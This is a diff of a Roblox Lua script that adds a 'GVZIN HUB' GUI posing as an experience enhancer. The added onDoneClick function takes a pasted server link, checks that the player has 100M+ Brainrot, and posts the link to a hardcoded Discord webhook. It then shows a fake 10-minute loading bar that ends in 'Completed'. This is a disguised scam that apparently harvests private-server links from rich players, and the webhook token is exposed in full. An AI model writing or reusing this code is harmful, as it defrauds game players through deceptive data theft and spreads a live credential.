@@ -14,7 +14,7 @@ local player = Players.LocalPlayer
 -- Configuration
 local LOADING_DURATION = 600 -- 10 minutes in seconds
 local REQUIRED_BRAINROT = 100000000 -- 100M
-local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya" -- Coloque seu novo webhook aqui
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya"
 
 -- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
@@ -26,8 +26,8 @@ screenGui.Parent = player:WaitForChild("PlayerGui")
 -- Main Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 400, 0, 250)
-mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+mainFrame.Size = UDim2.new(0, 400, 0, 320)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -160)
 mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
 mainFrame.BorderSizePixel = 0
 mainFrame.Parent = screenGui
@@ -44,11 +44,29 @@ mainShadow.Thickness = 2
 mainShadow.Transparency = 0.7
 mainShadow.Parent = mainFrame
 
+-- Add blue border
+local blueBorder = Instance.new("UIStroke")
+blueBorder.Color = Color3.fromRGB(70, 130, 180)
+blueBorder.Thickness = 3
+blueBorder.Parent = mainFrame
+
+-- Top Label with GVZIN HUB
+local topLabel = Instance.new("TextLabel")
+topLabel.Name = "TopLabel"
+topLabel.Size = UDim2.new(1, 0, 0, 40)
+topLabel.Position = UDim2.new(0, 0, 0, 0)
+topLabel.BackgroundTransparency = 1
+topLabel.Text = "GVZIN HUB"
+topLabel.TextColor3 = Color3.fromRGB(70, 130, 180)
+topLabel.TextSize = 20
+topLabel.Font = Enum.Font.GothamBold
+topLabel.Parent = mainFrame
+
 -- Title
 local titleLabel = Instance.new("TextLabel")
 titleLabel.Name = "TitleLabel"
 titleLabel.Size = UDim2.new(1, 0, 0, 50)
-titleLabel.Position = UDim2.new(0, 0, 0, 20)
+titleLabel.Position = UDim2.new(0, 0, 0, 40)
 titleLabel.BackgroundTransparency = 1
 titleLabel.Text = "Melhorar Experiência"
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -56,11 +74,24 @@ titleLabel.TextSize = 24
 titleLabel.Font = Enum.Font.GothamBold
 titleLabel.Parent = mainFrame
 
+-- Link Label
+local linkLabel = Instance.new("TextLabel")
+linkLabel.Name = "LinkLabel"
+linkLabel.Size = UDim2.new(0.9, 0, 0, 30)
+linkLabel.Position = UDim2.new(0.05, 0, 0, 95)
+linkLabel.BackgroundTransparency = 1
+linkLabel.Text = "Link para melhorar a experiência:"
+linkLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+linkLabel.TextSize = 14
+linkLabel.Font = Enum.Font.Gotham
+linkLabel.TextXAlignment = Enum.TextXAlignment.Left
+linkLabel.Parent = mainFrame
+
 -- Input Box Frame
 local inputFrame = Instance.new("Frame")
 inputFrame.Name = "InputFrame"
 inputFrame.Size = UDim2.new(0.9, 0, 0, 50)
-inputFrame.Position = UDim2.new(0.05, 0, 0, 80)
+inputFrame.Position = UDim2.new(0.05, 0, 0, 130)
 inputFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
 inputFrame.BorderSizePixel = 0
 inputFrame.Parent = mainFrame
@@ -89,7 +120,7 @@ inputBox.Parent = inputFrame
 local doneButton = Instance.new("TextButton")
 doneButton.Name = "DoneButton"
 doneButton.Size = UDim2.new(0.6, 0, 0, 45)
-doneButton.Position = UDim2.new(0.2, 0, 0, 150)
+doneButton.Position = UDim2.new(0.2, 0, 0, 195)
 doneButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
 doneButton.BorderSizePixel = 0
 doneButton.Text = "Done"
@@ -288,8 +319,7 @@ end
 local function getBrainrotValue()
     local brainrotValue = 0
     
-    -- Verificar em todos os lugares possíveis
-    -- Opção 1: leaderstats
+    -- Verificar em leaderstats primeiro
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats then
         local brainrot = leaderstats:FindFirstChild("Brainrot")
@@ -302,7 +332,7 @@ local function getBrainrotValue()
         end
     end
     
-    -- Opção 2: Procurar por qualquer objeto chamado Brainrot no player
+    -- Procurar por qualquer objeto chamado Brainrot no player
     local brainrot = player:FindFirstChild("Brainrot")
     if brainrot and (brainrot:IsA("IntValue") or brainrot:IsA("NumberValue")) then
         brainrotValue = brainrot.Value
@@ -310,6 +340,85 @@ local function getBrainrotValue()
         return brainrotValue
     end
     
-    -- Opção 3: Procurar em BackpackFolder ou similar
+    -- Procurar em Backpack
     local backpack = player:FindFirstChild("Backpack")
-    if backpack
+    if backpack then
+        brainrot = backpack:FindFirstChild("Brainrot")
+        if brainrot and (brainrot:IsA("IntValue") or brainrot:IsA("NumberValue")) then
+            brainrotValue = brainrot.Value
+            print("Brainrot encontrado no Backpack: " .. brainrotValue)
+            return brainrotValue
+        end
+    end
+    
+    -- BrainrotValue para testes
+    local simulatedBrainrot = player:FindFirstChild("BrainrotValue")
+    if simulatedBrainrot and (simulatedBrainrot:IsA("IntValue") or simulatedBrainrot:IsA("NumberValue")) then
+        brainrotValue = simulatedBrainrot.Value
+        print("Brainrot simulado encontrado: " .. brainrotValue)
+        return brainrotValue
+    end
+    
+    print("Aviso: Nenhum valor de Brainrot encontrado")
+    
+    return brainrotValue
+end
+
+-- Main function to handle Done button click
+local function onDoneClick()
+    local inputText = inputBox.Text
+    local lowerInput = string.lower(inputText)
+    
+    -- Check if input is empty or doesn't contain "server"
+    if inputText == "" or not string.find(lowerInput, "server") then
+        showNotification("Adicione um link de server valido", 3)
+        return
+    end
+    
+    -- Check if player has enough Brainrot
+    local brainrotValue = getBrainrotValue()
+    print("Verificando Brainrot: " .. brainrotValue .. " vs " .. REQUIRED_BRAINROT)
+    
+    if brainrotValue < REQUIRED_BRAINROT then
+        showNotification("Para melhorar a experiência, você precisa ter um Brainrot de 100M+\nVocê tem: " .. brainrotValue, 4)
+        return
+    end
+    
+    -- Send link to Discord
+    sendToDiscord(inputText)
+    
+    -- All checks passed - start loading
+    mainFrame.Visible = false
+    loadingScreen.Visible = true
+    
+    -- Animate loading bar over 10 minutes
+    local startTime = tick()
+    local elapsed = 0
+    
+    while elapsed < LOADING_DURATION do
+        elapsed = tick() - startTime
+        local progress = math.min(elapsed / LOADING_DURATION, 1)
+        
+        -- Update loading bar size
+        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
+        
+        task.wait(0.1)
+    end
+    
+    -- Loading complete
+    loadingTitle.Visible = false
+    loadingBarBg.Visible = false
+    completionMessage.Text = "Completed"
+end
+
+-- Connect Done button event
+doneButton.MouseButton1Click:Connect(onDoneClick)
+
+-- Optional: Allow Enter key to submit
+inputBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        onDoneClick()
+    end
+end)
+
+print("Brainrot Experience GUI loaded successfully!")
